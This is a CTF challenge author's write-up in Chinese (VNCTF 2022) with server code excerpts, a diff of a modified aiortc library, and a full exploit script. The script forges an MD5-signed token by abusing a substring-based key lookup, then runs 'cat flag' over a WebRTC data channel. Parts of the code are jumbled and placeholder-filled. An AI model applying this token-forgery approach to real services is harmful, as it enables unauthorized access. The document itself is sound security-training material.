# 伽玛实验场 | PDC面壁计划管理系统-出题人视角

> 原文: https://www.ctfiot.com/100552.html
> ID: 100552

编者荐语：

感谢小蓝蓝师傅的投稿，本题已部署在伽玛实验场，欢迎各位师傅前去挑战~也欢迎各位师傅踊跃投稿。

写在前面

打了VNCTF 2022的选手可能会发现本文中提到的部分文件与比赛中的附件有些许出入，这是因为我在比赛的前一天试图提升难度，建立了新的附件包。但是由于整体比赛环境均已搭建完成，替换附件会带来不稳定因素，因此最后没有替换成更高难度的附件。本文所述内容以及复现环境均使用新版附件。

题目分析——发现证书体系变更

首先，我们拿到附件包，可以看到附件包中有四个文件。

这四个文件分别是：

aiortc – app.py中引用的库文件

app.py – 部分源码

cmdHostory – 部分部署命令

important.pcapng – 流量包

其中，aiortc其实是一个开源的软件包。Github：(https://github.com/aiortc/aiortc) 但是这里在附件里给出，说明要么此处使用了较老的版本，要么是对其中内容进行了魔改。此处我们可以使用diff方法对两个包进行分析。首先我们下载主分支软件包，之后将其与附件中的aiortc放置于同一目录下。

使用每个会话秘密的密钥日志文件(

https://wiki.wireshark.org/TLS#using-the-pre-master-secret

)。

使用 RSA 私钥解密。 密钥日志文件是一种始终启用解密的通用机制，即使正在使用 Diffie-Hellman (DH) 密钥交换也是如此。 RSA 私钥仅在有限的情况下有效。 关键日志文件是Firefox、Chrome和curl等应用程序在运行时生成的文本文件。 SSLKEYLOGFILE环境变量已设置。 准确地说，它们的底层库（NSS、OpenSSL 或 boringssl）将所需的每个会话机密写入文件。 随后可以在 Wireshark 中配置此文件(

https://wiki.wireshark.org/TLS#using-the-pre-master-secret

)。

服务器选择的密码套件未使用 (EC)DHE。

协议版本为 SSLv3，(D)TLS 1.0-1.2。 它不适用于 TLS 1.3。

私钥与 服务器 证书匹配。 它不适用于 客户端 证书，也不适用于证书颁发机构 (CA) 证书。

会议尚未恢复。 握手必须包含 ClientKeyExchange 握手消息。 通常建议使用密钥日志文件，因为它适用于所有情况，但需要持续从客户端或服务器应用程序导出机密信息的能力。 RSA 私钥的唯一优点是它只需要在 Wireshark 中配置一次即可启用解密，但受到上述限制。

首先访问tell2me，传递三个参数sdp、type、token：

随后双方建立DTLS信道，在此信道中，首先发送ls。

之后还没收到回复就直接发送了cat flag。

之后连续收到了两个回复，分别是server.py flag：

以及cat: flag: Permission denied:

是JSON格式且不存在语法错误

存在token字段

token字段长度大于50字节 之后按长度进行拆分，其中最后一部分内容为不定长的PK，服务端维护PK-SK的映射表。依次遍历映射表，如果服务端PK是Client传来的PK的子集，则认为应当使用此PK对应的SK，之后如果再次命中，则使用新的SK。可以看到这个逻辑其实很奇怪，明明是直接sk=pk2sk[pk]就能解决的问题，结果实现的这么奇怪，大史说过“邪乎到家必有鬼”，所以这里其实就是漏洞点。

无论登录的身份是什么，实际上都会走webRTC建立后续的信道进行通信。

可以参考aiortc官方提供的example，本题实现没有过多改动。联想到之前流量分析时提示的是无权限读flag，那么我们其实只要以伟思的身份传token再正常建立一个WebRTC Client重发xiaolanlan:
cat flag就可以拿到flag了。

第一点也是最重要的一点，由于webRTC在实现时，会调用内核能力自动选择可用的UDP端口进行信道建立，这使得我们无法使用单一端口映射的方式部署，而端口区间映射也容易导致打不通，所以最优解是使用host模式部署，与宿主机共享端口，独占VPS，这里也再次感谢春秋GAME提供资源，给各位CTFer一个复现的机会。

另外，WebRTC作为P2P长连接通信，会涉及Server反连，WebRTC本身支持TUN/STUN方式进行内网穿透。因此，各位选手无需进行额外设置，在本地即可打通，但是仍需注意的是，部分公司/学校会将内网穿透认定为违规行为，利用TUN/STUN方式进行内网穿透是极容易被检测到的行为。因此，若您的公司/学校有相关规定，请勿在其办公网/校园网进行本赛题的复现。

最后由于内网穿透本身的不稳定性，有可能会反连失败，因此，如果你的EXP打不通，请积极重试。(卡在上图红框位置就是反连失败了)

运行脚本时，请注意使用随附件给出的aiortc版本，否则可能会导致SSL证书链算法不兼容导致TLS握手失败。（如果这句看不懂，请重读本文”题目分析——发现证书体系变更”一节）

END

春秋GAME伽玛实验室

会定期分享赛题赛制设计、解题思路……

如果你日常有一些技术研究和好的设计思路

或在赛后对某道题有另辟蹊径的想法

欢迎找到春秋GAME投稿哦～

联系vx:
cium0309

欢迎加入 春秋GAME CTF交流2群
Q群:
703460426


```
-from cryptography.hazmat.primitives.asymmetric import rsa
+from cryptography.hazmat.primitives.asymmetric import ec
+from OpenSSL import SSL, crypto

-def generate_certificate(key: rsa.RSAPrivateKey) -> x509.Certificate:
+def generate_certificate(key: ec.EllipticCurvePrivateKey) -> x509.Certificate:

-key = rsa.generate_private_key(public_exponent=65537, key_size=2048, backend=default_backend())
+key = ec.generate_private_key(ec.SECP256R1(), default_backend())
@@ -46,42 +40,25 @@

 logger = logging.getLogger(__name__)

-assert lib.OpenSSL_version_num() >= 0x10002000, "OpenSSL 1.0.2 or better is required"

-# Log TLS secrets to a file, similar to browsers
-SSLKEYLOGFILE = os.getenv('SSLKEYLOGFILE')
-if SSLKEYLOGFILE:
-    logger.warning('Logging all TLS keys to %s', SSLKEYLOGFILE)
+def DTLSv1_get_timeout(self):
+    ptv_sec = SSL._ffi.new("time_t *")
+    ptv_usec = SSL._ffi.new("long *")
+    if SSL._lib.Cryptography_DTLSv1_get_timeout(self._ssl, ptv_sec, ptv_usec):
+        return ptv_sec[0] + (ptv_usec[0] / 1000000)
+    else:
+        return None

-class DtlsError(Exception):
-    pass
async def download(request):
    query = query_parse(request)
    if query == None or 'file' not in query.keys():
        content = "PDC 已经记录了您这次访问行为，普通民众请勿随意访问此系统！"
        return web.Response(status=403, content_type="text/html", text=content)
    filename = query.get('file')
    file_dir = ''
    file_path = os.path.join(file_dir, filename)
    if filename != '':
        content = "PDC 已经记录了您这次访问行为，普通民众请勿随意访问此系统！"
        return web.Response(status=403, content_type="text/html", text=content)
    if os.path.exists(file_path):
        async with aiofiles.open(file_path, 'rb') as f:
            content = await f.read()
        if content:
            response = web.Response(
                content_type='application/octet-stream',
                headers={'Content-Disposition': 'attachment;filename={}'.format(filename)},
                body=content)
            return response
        else:
            return web.Response(status=404, content_type="text/html", text="文件为空")
    else:
        return web.Response(status=404, content_type="text/html", text="文件未找到")
try:
    params = await request.json()
except json.decoder.JSONDecodeError:
    content = "PDC 已经记录了您这次访问行为，普通民众请勿随意访问此系统！"
    return web.Response(status=403, content_type="text/html", text=content)
if "token" not in params.keys():
    content = "PDC 已经记录了您这次访问行为，普通民众请勿随意访问此系统！"
    return web.Response(status=403, content_type="text/html", text=content)
else:
    submitToken = str(params["token"])
    if len(submitToken) < 32 + 13 + 5:
        content = "PDC 已经记录了您这次攻击行为！"
        return web.Response(status=403, content_type="text/html", text=content)
    else:
        pk = submitToken[45:]
        sk = ""
        for pkKey in pk2sk.keys():
            if pkKey in pk:
                sk = pk2sk[pkKey]
        if sk == "":
            content = "PDC 已经记录了您这次攻击行为！"
            return web.Response(status=403, content_type="text/html", text=content)
        else:
            timeStamp = int(round(time.time()) * 1000)
            signText = f"{submitToken[32:45]}-{sk}"
            md5Object = hashlib.md5()
            md5Object.update(signText.encode())
            if md5Object.hexdigest().upper() != submitToken[:32]:
                content = "PDC 已经记录了您这次攻击行为！"
                return web.Response(status=403, content_type="text/html", text=content)
            elif(timeStamp - int(submitToken[32:45]) < 600000):
                if submitToken[45:50] == '?????':
pk2sk = {"?????":"","?????":"8d509c28896865f8640f328f30f15721"}
2D041B4B9AA98AFAB545FE0F4651E7951674991453000weisi
pk2sk = {"luoji":"","weisi":"8d509c28896865f8640f328f30f15721"}
timeStamp = 1674991453000
pk = weisi
signText = 2D041B4B9AA98AFAB545FE0F4651E795
if submitToken[45:50] == '?????':
if submitToken[45:50] == '?????':
    if "sdp" not in params.keys() or "type" not in params.keys():
        content = "您好，?????！"
        return web.Response(content_type="text/html", text=content)
    else:
        offer = RTCSessionDescription(sdp=params["sdp"], type=params["type"])
        pc = RTCPeerConnection()
        pcs.add(pc)
        @pc.on("datachannel")
        
        @pc.on("connectionstatechange")
        
        
        return web.Response(
            content_type="application/json",
            text=json.dumps(
                {"sdp": pc.localDescription.sdp, "type":pc.localDescription.type}
            ),

        )

elif submitToken[45:50] == '?????':
    if "sdp" not in params.keys() or "type" not in params.keys():
        content = "您好，?????！"
        return web.Response(content_type="text/html", text=content)
    else:
        offer = RTCSessionDescription(sdp=params["sdp"], type=params["type"])
        pc = RTCPeerConnection()
        pcs.add(pc)
        @pc.on("datachannel")
        
        @pc.on("connectionstatechange")
        
        
        return web.Response(
            content_type="application/json",
            text=json.dumps(
                {"sdp": pc.localDescription.sdp, "type":pc.localDescription.type}
            ),
        )
import requests
import time
import json
import hashlib
import asyncio
import argparse
from aiortc import RTCIceCandidate, RTCPeerConnection, RTCSessionDescription
from aiortc.contrib.signaling import BYE, add_signaling_arguments, create_signaling
from aiortc.sdp import candidate_from_sdp, candidate_to_sdp
from cryptography.hazmat.primitives import serialization
time_start = None
pk = "luojiweisi"
sk = "8d509c28896865f8640f328f30f15721"
url = "http://url/tell2me"

def object_to_string(obj):
    if isinstance(obj, RTCSessionDescription):
        message = {"sdp": obj.sdp, "type": obj.type}
    elif isinstance(obj, RTCIceCandidate):
        message = {
            "candidate": "candidate:" + candidate_to_sdp(obj),
            "id": obj.sdpMid,
            "label": obj.sdpMLineIndex,
            "type": "candidate",
        }
    else:
        assert obj is BYE
        message = {"type": "bye"}
    return message
    
def object_from_string(message_str):
    message = json.loads(message_str)
    if message["type"] in ["answer", "offer"]:
        return RTCSessionDescription(**message)
    elif message["type"] == "candidate" and message["candidate"]:
        candidate = candidate_from_sdp(message["candidate"].split(":", 1)[1])
        candidate.sdpMid = message["id"]
        candidate.sdpMLineIndex = message["label"]
        return candidate
    elif message["type"] == "bye":
        return BYE

def channel_log(channel, t, message):
    print("channel(%s) %s %s" % (channel.label, t, message))

  
def channel_send(channel, message):
    channel_log(channel, ">", message)
    channel.send(message)

def current_stamp():
    global time_start
    if time_start is None:
        time_start = time.time()
        return 0
    else:
        return int((time.time() - time_start) * 1000000)

async def consume_signaling(pc, signaling):
    while True:
        obj = await signaling.receive()
        if isinstance(obj, RTCSessionDescription):
            await pc.setRemoteDescription(obj)
            if obj.type == "offer":
                # send answer
                await pc.setLocalDescription(await pc.createAnswer())
                await signaling.send(pc.localDescription)
        elif isinstance(obj, RTCIceCandidate):
            await pc.addIceCandidate(obj)
        elif obj is BYE:
            print("Exiting")
            break

def sendSDPRequest(WRTCConnectionInfo):
    timeStamp = int(round(time.time()) * 1000)
    signText = f"{timeStamp}-{sk}"
    md5Object = hashlib.md5()
    md5Object.update(signText.encode())
    signValue = md5Object.hexdigest().upper()
    WRTCConnectionInfo["token"] = f"{signValue}{timeStamp}{pk}"
    res = requests.post(url,json=WRTCConnectionInfo)
    return res.text

async def run_offer(pc, signaling):
    await signaling.connect()
    channel = pc.createDataChannel("chat")

    async def send_ls():
        channel_send(channel, f"xiaolanlan:ls")
        await asyncio.sleep(1)
        
    async def send_cat_flag():
        channel_send(channel, f"xiaolanlan:
cat flag")
        await asyncio.sleep(1)
        
    @channel.on("open")
    def on_open():
        print("Connect Open!")
        asyncio.ensure_future(send_ls())
        asyncio.ensure_future(send_cat_flag())

    @channel.on("message")
    def on_message(message):
        channel_log(channel, "<", message)
    # send offer
    await pc.setLocalDescription(await pc.createOffer())
    sdpResponse = sendSDPRequest(object_to_string(pc.localDescription))
    # await signaling.send(pc.localDescription)
    obj = object_from_string(sdpResponse)
    if isinstance(obj, RTCSessionDescription):
        await pc.setRemoteDescription(obj)
        if obj.type == "offer":
            # send answer
            await pc.setLocalDescription(await pc.createAnswer())
            await signaling.send(pc.localDescription)
    elif isinstance(obj, RTCIceCandidate):
        await pc.addIceCandidate(obj)
    elif obj is BYE:
        print("Exiting")
    await consume_signaling(pc, signaling)

if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    add_signaling_arguments(parser)
    args = parser.parse_args()
    signaling = create_signaling(args)
    pc = RTCPeerConnection()
    private_key = pc._RTCPeerConnection__certificates[0]._key
    public_key = private_key.public_key()
    rsa_pem = private_key.private_bytes(encoding=serialization.Encoding.PEM,format=serialization.PrivateFormat.TraditionalOpenSSL,encryption_algorithm=serialization.NoEncryption())
    coro = run_offer(pc, signaling)
    loop = asyncio.get_event_loop()
    try:
        loop.run_until_complete(coro)
    
except KeyboardInterrupt:
        pass
    finally:
        loop.run_until_complete(pc.close())
        loop.run_until_complete(signaling.close())
```


---
## 附图

![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/02/10-1677581356.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/02/8-1677581357.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/02/4-1677581357.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/02/10-1677581358.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/02/2-1677581358.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/02/6-1677581359.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/02/7-1677581359.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/02/1-1677581360.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/02/6-1677581361.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/02/2-1677581363.png)